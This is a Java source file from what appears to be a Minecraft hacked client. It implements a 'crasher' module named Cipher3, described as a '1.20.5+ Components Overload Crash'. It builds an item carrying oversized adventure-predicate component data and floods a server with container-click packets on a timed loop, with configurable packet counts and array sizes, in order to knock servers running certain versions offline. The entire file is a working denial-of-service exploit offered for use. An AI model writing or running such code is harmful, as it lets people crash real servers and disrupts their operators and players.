package us.rin.crashers.impl;

import de.florianmichael.vialoadingbase.ViaLoadingBase;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import org.jetbrains.annotations.NotNull;
import us.rin.crashers.Crasher;
import us.rin.gui.clickgui.ClickGui;
import us.rin.protocol.RedSignalProtocol;
import us.rin.protocol.components.data.DataComponents;
import us.rin.protocol.components.data.impl.DataAdventurePredicate;
import us.rin.protocol.components.objects.ItemStack;
import us.rin.protocol.packets.PacketCodec;
import us.rin.protocol.packets.play.PacketContainerClick;
import us.rin.utils.OptionType;
import us.rin.utils.OptionUtil;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class Cipher3 implements Crasher {
    private static final String METHOD_NAME = "Cipher3";
    private boolean enabled = false;
    private ScheduledExecutorService executorService;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int length = Integer.parseInt(args[3]);
        int amount = Integer.parseInt(args[4]);
        int size = Integer.parseInt(args[5]);
        int threadSleep = Integer.parseInt(args[6]);
        long loopAmount = Long.parseLong(args[7]);
        setEnabled(true);

        if (executorService != null && !executorService.isShutdown()) {
            executorService.shutdownNow();
            msgHelper.sendMessage("Previous attack &cstopped&7!", true);
        }

        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.IS_VISIBLE ? getName() : "******"), true);

        int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();
        if (RedSignalProtocol.SUPPORTED_PROTOCOLS.contains(protocol) && protocol < 769) {

            ItemStack item = getItemStack(length, amount, size);

            AtomicInteger check = new AtomicInteger(0);
            executorService = Executors.newSingleThreadScheduledExecutor();
            Runnable clickTask = () -> {
                if (!enabled || check.get() >= loopAmount || (mc.getConnection() == null || !mc.getConnection().getConnection().isConnected())) {
                    executorService.shutdown();
                    setEnabled(false);
                    msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
                    return;
                }
                PacketCodec.sendPacket(new PacketContainerClick(protocol, 0, 1, 37,
                        PacketContainerClick.ContainerActionType.CLICK_ITEM, PacketContainerClick.ContainerAction.LEFT_CLICK,
                        item, new Int2ObjectArrayMap<>()), packets);
                check.getAndIncrement();
            };
            executorService.scheduleWithFixedDelay(clickTask, 0, threadSleep, TimeUnit.MILLISECONDS);
        } else {
            msgHelper.sendMessage("To use " + getName() + " you must be using &cVersion 1.20.5/1.21.3&7, and your current protocol is &c" + protocol, true);
        }
    }

    private static @NotNull ItemStack getItemStack(int arraySize, int listSize1, int listSize2) {
        List<DataAdventurePredicate.BlockPredicate> blockPredicates = new ArrayList<>();
        List<DataAdventurePredicate.PropertyMatcher> properties = new ArrayList<>();
        int[] array = new int[arraySize];

        for (int i = 0; i < listSize1; i++)
            properties.add(new DataAdventurePredicate.PropertyMatcher("", ""));

        for (int i = 0; i < listSize2; i++) {
            blockPredicates.add(
                    new DataAdventurePredicate.BlockPredicate(
                            array,
                            properties,
                            null
                    )
            );
        }

        DataAdventurePredicate dataAdventurePredicate = new DataAdventurePredicate(blockPredicates);

        DataComponents components = new DataComponents();
        components.put(dataAdventurePredicate);

        return new ItemStack(1, 1, components);
    }


    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public String getArgsUsage() {
        return "packets[1000], length[42], amount[0], size[2048], thread-sleep[2000], loop-amount[10]";
    }

    @Override
    public List<OptionUtil> getOptions() {
        return List.of(
                new OptionUtil("Packets", OptionType.INTEGER),
                new OptionUtil("Length", OptionType.INTEGER),
                new OptionUtil("Amount", OptionType.INTEGER),
                new OptionUtil("Size", OptionType.INTEGER),
                new OptionUtil("Thread Sleep", OptionType.INTEGER),
                new OptionUtil("Loop Amount", OptionType.INTEGER)
        );
    }

    @Override
    public String getDescription() {
        return "1.20.5+ Components Overload Crash";
    }
}